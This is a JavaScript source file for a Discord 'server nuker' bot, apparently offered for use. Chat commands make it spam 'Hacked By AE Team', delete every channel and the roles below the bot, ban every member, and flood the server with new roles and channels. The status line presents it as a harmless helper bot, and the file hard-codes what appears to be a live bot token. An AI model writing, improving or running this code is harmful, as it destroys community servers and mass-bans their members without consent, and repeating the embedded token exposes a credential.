const Discord = require("discord.js");
const client = new Discord.Client();


client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setGame("watching counters | s/help");
  });

  client.on('message', async msg => {
    if (msg.content === "-spam chat") {
   setInterval(function () {msg.channel.send('Hacked By AE Team')}, 1000);
    }
    if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Discord Server Nuker Bot | Dev : INFINITY"));
    }
if(msg.content.toLowerCase().startsWith("n!" + "ban")){
    msg.guild.members.tap(member => member.ban("Discord Server Nuker Bot | Dev : INFINITY"));
    }
    if (msg.content === "-spam role") {
        setInterval(function (){
            msg.guild.createRole();
        }, 100);
    }
    if (msg.content === "-spam channels") {
        var i = 0
        setInterval(function (){
            msg.guild.createChannel(i);
            console.log("Created channel called #" + i + " in " + msg.guild.name);
            i = i + 1
        }, 100);
    }
    if (msg.content === "-delete channel") {
        msg.channel.delete();
    }
    if (msg.content === "-delete channels") {
        client.channels.get(permstor[msg.guild.id].reportchannel).delete();
    }
});



client.login("Njk1MjQ5MTExNzkxNjk3OTMy.XoiXgQ.Bx-UEnToD2lxex-xQMsS7kxWNHI");
